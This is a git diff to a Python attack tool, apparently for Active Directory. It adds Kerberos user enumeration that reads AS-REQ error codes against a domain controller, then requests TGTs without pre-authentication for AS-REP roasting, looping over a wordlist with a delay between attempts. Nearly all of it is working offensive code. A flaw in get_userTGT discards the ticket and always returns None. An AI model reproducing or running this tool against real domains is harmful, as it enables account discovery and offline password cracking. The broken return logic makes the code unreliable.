@@ -5,6 +5,12 @@ import argparse
 import threading
 import sys
 import traceback
+import socket
+from impacket.krb5 import constants
+from impacket.krb5.asn1 import TGS_REP, AS_REP
+from impacket.krb5.ccache import CCache
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, SessionError
+from impacket.krb5.types import Principal
 try:
     from utils.adconn import LdapConn
     from utils.tickets import TGT, TGS
@@ -23,10 +29,64 @@ def build_queue(file) -> Queue:
     return q
 
 
+def enumerate_user(user, domain, dc):
+    dc_ip = socket.gethostbyname(dc)
+    userclient = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    try:
+        getKerberosTGT(userclient,domain=domain,dcHost=dc_ip)
+    except SessionError as e:
+        code = e.getErrorCode()
+        if code != 6:
+            print(f'[+] Found user: {user}@{domain}')
+            return user
+        else:
+            return None
+        
 
-def get_user(user, domain, dc):
-    T = TGT(domain=domain, username=user, dc=dc, preauth=False)
-    tgt_data = T.run()
+        # userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        # try:
+        #     tgt, cipher, oldSessionKey, newSessionKey = getKerberosTGT(userclient, password=self.password, 
+        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
+        #                                        kdcHost=self.dc_ip)
+        
+        #     return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':oldSessionKey, 'newSessionKey':newSessionKey}
+        
+        # except AttributeError:
+        #     sys.stdout.flush()
+        #     print("")
+        #     print(f"\n3 found user: {self.username} \n")
+        #     return None
+        # except SessionError as e:
+        #     try:
+        #         code = e.getErrorCode()
+        #         if code != 6:
+        #             sys.stdout.flush()
+        #             print(f"\n 1found user: {self.username} {e} on code: {code}")
+        #     except:
+        #         sys.stdout.flush()
+        #         print(f"\n 2found user: {self.username}")
+        # except Exception as e:
+        #     print(f"1 {traceback.format_exc()}")
+        #     print(f'trying with domain instead of user....')
+        #     serverName = Principal('ldap/%s' % self.domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
+        #     try:
+        #         tgt, cipher, old, new = getKerberosTGT(serverName, password=self.password, 
+        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
+        #                                        kdcHost=self.dc_ip)
+        #         return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':old, 'newSessionKey':new}
+        #     except Exception as e:
+        #         None
+
+        #     return 1
+
+
+
+def get_userTGT(user, domain, dc):
+    valid = enumerate_user(user, domain, dc)
+    if valid != None:
+        T = TGT(domain=domain, username=user, dc=dc, preauth=False)
+        tgt_data = T.run()
+    tgt_data = None
     return tgt_data
     # if tgt_data != None:
     #     tgt = tgt_data['tgt']
@@ -49,19 +109,11 @@ def run(domain, dc, delay):
     while not q.empty():
         user = q.get()
         try:
-            tgs = get_user(user,domain,dc)
-            if tgs != None:
-                print(tgs)
+            data = get_userTGT(user,domain,dc)
+            if data != None:
+                print(data)
         except Exception as e:
-            try:
-                code = e.getErrorCode()
-                if code ==6:
-                    None
-            except AttributeError:
-                None
-            except Exception as e2:
-                print(f'this user: {user} fucket it up >:(')
-                print(traceback.print_exc())
+            print(e)
         finally:
             t.sleep(delay)
 
